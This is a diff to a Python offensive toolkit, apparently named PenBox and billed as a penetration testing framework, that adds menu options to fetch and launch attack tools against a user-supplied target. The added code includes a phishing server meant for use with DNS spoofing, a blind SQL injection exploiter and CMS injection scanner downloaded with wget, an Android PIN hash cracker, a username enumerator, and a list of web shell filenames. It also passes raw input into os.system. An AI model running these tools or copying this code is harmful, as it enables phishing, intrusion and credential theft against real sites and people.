@@ -29,8 +29,13 @@ from optparse import OptionParser
 from time import sleep
 ########################## 
 #Variables
+directories = ['/uploads/','/upload/','/files/','/resume/','/resumes/','/documents/','/docs/','/pictures/','/file/','/Upload/','/Uploads/','/Resume/','/Resume/','/UsersFiles/','/Usersiles/','/usersFiles/','/Users_Files/','/UploadedFiles/','/Uploaded_Files/','/uploadedfiles/','/uploadedFiles/','/hpage/','/admin/upload/','/admin/uploads/','/admin/resume/','/admin/resumes/','/admin/pictures/','/pics/','/photos/','/Alumni_Photos/','/alumni_photos/','/AlumniPhotos/','/users/']
+shells = ['wso.php','shell.php','an.php','hacker.php','lol.php','up.php','cp.php','upload.php','sh.php','pk.php','mad.php','x00x.php','worm.php','1337worm.php','config.php','x.php','haha.php']
+upload = []
 yes = set(['yes','y', 'ye', 'Y'])
 no = set(['no','n'])
+########################## 
+#end of varialbles 
 def logo():
     print """
   ______                 ______                
@@ -38,12 +43,12 @@ def logo():
   _____) )  ____  ____   ____)  )  ___   _   _ 
  |  ____/  / _  )|  _ \ |  __  (  / _ \ ( \ / )
  | |      ( (/ / | | | || |__)  )| |_| | ) X ( 
- |_|       \____)|_| |_||______/  \___/ (_/ \_) V2.1
+ |_|       \____)|_| |_||______/  \___/ (_/ \_) V2.2
                          A Penetration Testing Framework
                                                                         
 
 [+]       Coded BY Mohamed Nour & Fedy Wesleti       [+] 
-[+]         FB/mohamednour.tn   ~~ FB/CEH.tN         [+] 
+[+]         FB/mohamed.zeus.0   ~~ FB/CEH.tN         [+] 
 [+]             Greetz To All Pentesters             [+] 
 
 """
@@ -54,12 +59,12 @@ def menu():
   _____) )  ____  ____   ____)  )  ___   _   _ 
  |  ____/  / _  )|  _ \ |  __  (  / _ \ ( \ / )
  | |      ( (/ / | | | || |__)  )| |_| | ) X ( 
- |_|       \____)|_| |_||______/  \___/ (_/ \_) V2
+ |_|       \____)|_| |_||______/  \___/ (_/ \_) V2.2
                          A Penetration Testing Framework
                                                                         
 
 [+]       Coded BY Mohamed Nour & Fedy Wesleti       [+] 
-[+]         FB/mohamednour.tn   ~~ FB/CEH.tN         [+] 
+[+]         FB/mohamed.zeus.0   ~~ FB/CEH.tN         [+] 
 [+]             Greetz To All Pentesters             [+] 
 
     Select from the menu:
@@ -124,14 +129,42 @@ def postexp():
     clearScr()
     print("1:  Shell Checker")
     print("2:  POET")
+    print("3:  Weeman - Phishing Framework")
     print("99: Return to main menu ")
     choice11 = raw_input("Enter Your Choice:")
     if choice11 == "1":
         sitechecker()
     if choice11 == "2":
         poet()
+    if choice11 == "3":
+        weeman()
     elif choice11 == "99":
         menu()
+def scanusers():
+    site = raw_input('Enter a website : ')
+    try:
+        users = site
+        if 'http://www.' in users:
+            users = users.replace('http://www.', '')
+        if 'http://' in users:
+            users = users.replace('http://', '')
+        if '.' in users:
+            users = users.replace('.', '')
+        if '-' in users:
+            users = users.replace('-', '')
+        if '/' in users:
+            users = users.replace('/', '')
+        while len(users) > 2:
+            print users
+            resp = urllib2.urlopen(site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()
+            # i can use regular expression too
+            if 'invalid username' not in resp.lower():
+                print "\tFound -> %s" %users
+                pass
+
+            users = users[:-1]
+    except:
+        pass
 def brutex():
     clearScr()
     print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
@@ -139,6 +172,18 @@ def brutex():
     clearScr
     brutexchoice = raw_input("Select a Target : ")
     os.system("cd BruteX && chmod 777 brutex && ./brutex %s"%brutexchoice)
+def arachni():
+    print("Arachni is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications")
+    cara = raw_input("Install And Run ? Y / N : ")
+    clearScr
+    print("exemple : http://www.target.com/")
+    tara = raw_input("Select a target to scan : ")
+    if cara in yes:
+        os.system("git clone git://github.com/Arachni/arachni.git")
+        os.system("cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
+        os.system("archani")
+    clearScr()
+    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s"%tara)
 def xsstracer():
     clearScr()
     print("XSSTracer is a small python script that checks remote web servers for Clickjacking, Cross-Frame Scripting, Cross-Site Tracing and Host Header Injection.")
@@ -146,6 +191,15 @@ def xsstracer():
     clearScr ()
     xsstracerchoice = raw_input("Select a Target: ")
     os.system("cd XSSTracer && chmod 777 xsstracer.py && python xsstracer.py %s 80"%xsstracerchoice)
+def weeman():
+    print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
+    choicewee = raw_input("Install Weeman ? Y / N : ")
+    if choicewee in yes:
+        os.system("git clone https://github.com/Hypsurus/weeman.git && cd weeman && python weeman.py")
+    if choicewee in no:
+        menu()
+    else:
+        menu()    
 def gabriel():
     print("Abusing authentication bypass of Open&Compact (Gabriel's)")
     os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
@@ -178,6 +232,13 @@ def ifinurl():
         menu()
     else: 
         menu()
+def bsqlbf():
+    clearScr()
+    print("This tool will only work on blind sql injection")
+    cbsq=raw_input("select target : ")
+    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
+    os.system("perl bsqlbf.pl -url %s"%cbsq)
+    os.system("rm bsqlbf.pl")
 def venom():
     print ("Venom Automatic Shellcode Generator")
     print ("Do You To Install Venom ?")
@@ -225,6 +286,7 @@ def webhack():
     print("9 : Joomla! 1.5 - 3.4.5 remote code execution")
     print("10: Vbulletin 5.X remote code execution")
     print("11: BruteX - Automatically brute force all services running on a target")
+    print("12: Arachni - Web Application Security Scanner Framework")
     print("99: Exit")
     choiceweb = raw_input("Enter Your Choice : ")
     if choiceweb == "1":
@@ -250,6 +312,8 @@ def webhack():
         clearScr();vbulletinrce()
     if choiceweb =="11":
         clearScr();brutex()
+    if choiceweb=="12":
+        clearScr();arachni()
     elif choiceweb =="99":
         menu()
     elif choiceweb == "":
@@ -343,7 +407,6 @@ def wppluginscan():
                     print "| current site :" + site
                     print "| Found Plugin : "  + plugin
                     print "| Result:",resp
-#----------------------------------------------------------------
 def sqlmap():
     print ("usage : python sqlmap.py -h")
     choice8 = raw_input("Continue: y/n :")
@@ -355,10 +418,6 @@ def sqlmap():
         menu()
     else: 
         menu()
-directories = ['/uploads/','/upload/','/files/','/resume/','/resumes/','/documents/','/docs/','/pictures/','/file/','/Upload/','/Uploads/','/Resume/','/Resume/','/UsersFiles/','/Usersiles/','/usersFiles/','/Users_Files/','/UploadedFiles/','/Uploaded_Files/','/uploadedfiles/','/uploadedFiles/','/hpage/','/admin/upload/','/admin/uploads/','/admin/resume/','/admin/resumes/','/admin/pictures/','/pics/','/photos/','/Alumni_Photos/','/alumni_photos/','/AlumniPhotos/','/users/']
-shells = ['wso.php','shell.php','an.php','hacker.php','lol.php','up.php','cp.php','upload.php','sh.php','pk.php','mad.php','x00x.php','worm.php','1337worm.php','config.php','x.php','haha.php']
-upload = []
-#--------------
 def grabuploadedlink(url):
     try :
                     for dir in directories :
@@ -550,6 +609,7 @@ def info():
     print("6: CMS scanner")
     print("7: XSStracer - checks remote web servers for Clickjacking, Cross-Frame Scripting, Cross-Site Tracing and Host Header Injection")
     print("8: Doork - Google Dorks Passive Vulnerability Auditor ")
+    print("9: Scan A server's Users")
     print("99: Back To Main Menu")
     choice2 = raw_input("Select from the menu:")
     if choice2 == "1":
@@ -570,6 +630,8 @@ def info():
         clearScr();doork()
     elif choice2 =="99":
         clearScr(); menu()
+    if choice2 == "9":
+        clearScr();scanusers()
     elif choice2 == "":
         menu()
     else: 
@@ -586,6 +648,11 @@ def wpue():
     os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u"%xe)
 def priv8():
     tnn()
+def androidhash():
+    key=raw_input("Enter the android hash : ")
+    salt=raw_input("Enter the android salt : ")
+    os.system("git clone https://github.com/PentesterES/AndroidPINCrack.git")
+    os.system("cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s"% (key, salt))
 def passwd():
     print("1: Cupp ")
     print("2: Ncrack")
@@ -604,15 +671,25 @@ def passwd():
         fb()
     else: 
         menu()
+def bluepot():
+    print("you need to have at least 1 bluetooh receiver (if you have many it will work wiht those, too). You must install / libbluetooth-dev on Ubuntu / bluez-libs-devel on Fedora/bluez-devel on openSUSE ")
+    choice = raw_input("Continue ? Y / N : ")
+    if choice in yes:
+        os.system("wget https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz && tar xfz bluepot-0.1.tar.gz && sudo java -jar bluepot/BluePot-0.1.jar")
+    else : 
+        menu()
 def wire():
     print("1 : reaver ")
     print("2 : pixiewps")
+    print("3 : Bluetooth Honeypot GUI Framework")
     print("99: Back To The Main Menu")
     choice4 = raw_input("Select from the menu:")
     if choice4 =="1":
      clearScr();reaver()
     if choice4 =="2":
         clearScr(); pixiewps()
+    if choice4 =="3":
+        bluepot()
     elif choice4 =="99":
         menu()
     elif choice4 == "":
@@ -626,6 +703,9 @@ def exp():
     print("4 : commix")
     print("5 : FTP Auto Bypass")
     print("6 : jboss-autopwn")
+    print("7 : Blind SQL Automatic Injection And Exploit")
+    print("8 : Bruteforce the Android Passcode given the hash and salt")
+    print("9 : Joomla, Mambo, PHP-Nuke, and XOOPS CMS SQL injection Scanner")
     print("99 : Go Back To Main Menu")
     choice5 = raw_input("Select from the menu:")
     if choice5 =="2":
@@ -640,6 +720,12 @@ def exp():
         clearScr(); gabriel()
     if choice5 =="6":
         clearScr(); jboss()
+    if choice5 =="7":
+        clearScr();bsqlbf()
+    if choice5 =="8":
+        androidhash()
+    if choice5 =="9":
+        cmsfew()
     elif choice5 =="99":
         menu()
     elif choice5 == "":
@@ -667,6 +753,11 @@ def snif():
         menu()
     else: 
         menu()
+def cmsfew():
+    print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
+    target = raw_input("Select a target : ")
+    os.system("wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
+    os.system("python cms.py %s"%target)
 def smtpsend():
     os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
     clearScr()
@@ -861,9 +952,7 @@ class TNscan : #TNscan Function menu
                     if urllib.urlopen(site + zip1).getcode() == 200 :
                         print " [*] Found zip file -> ", site + zip1
                 except IOError :
-                    pass
- ############################  
- #find upload directories     
+                    pass    
     def findUp(self) :
         """
         find upload forms from grabbed 
@@ -882,9 +971,7 @@ class TNscan : #TNscan Function menu
                             if re.findall('type=file', line) :
                                 print " [*] Found upload -> ", site+up
                 except IOError :
-                    pass
- ############################ 
-#find users                  
+                    pass           
     def getUsers(self) :
         """
         get server users using a method found by 
@@ -921,8 +1008,6 @@ class TNscan : #TNscan Function menu
         clearScr()
         for user in userslist :
             print user
-############################        
-#bypass cloudflare   
     def cloudflareBypasser(self) :
         """
         trys to bypass cloudflare i already wrote
@@ -948,9 +1033,7 @@ class TNscan : #TNscan Function menu
                         print ' [*] Cloudflare bypassed -> ', ddd
                         break
                 except socket.error :
-                    pass
-############################   
-#find the server banner                 
+                    pass         
     def getServerBanner(self) :
         """
         simply gets the server banner 
@@ -963,9 +1046,7 @@ class TNscan : #TNscan Function menu
             httpresponse = urllib.urlopen(s)
             print ' [*] Server header -> ', httpresponse.headers.getheader('server')
         except:
-            pass
-############################    
-#greb the sqli         
+            pass        
     def grabSqli(self) :
         """
         just grabs all websites in server with php?id= dork 
@@ -987,8 +1068,6 @@ class TNscan : #TNscan Function menu
             page += 50  
         lista = unique(lista)       
         self.checkSqli(lista)
- ############################      
- #scan for sql injection  
     def checkSqli(self, s):
         """
         checks for error based sql injection,
@@ -1013,10 +1092,7 @@ class TNscan : #TNscan Function menu
                             if len(checker) != 0 :
                                 print ' [*] SQLi found -> ', power
             except:
-                pass
-############################   
-############################        
-#scan for ports  
+                pass  
 def portScanner(self, mode, ran) :
         """
         simple port scanner works with range of ports 
@@ -1144,7 +1220,6 @@ def maine():
       if choose == "4":
         about()
       if choose == "99":
-           
             menu()
       con = raw_input('Continue [Y/n] -> ')
       if con[0].upper() == 'N' :
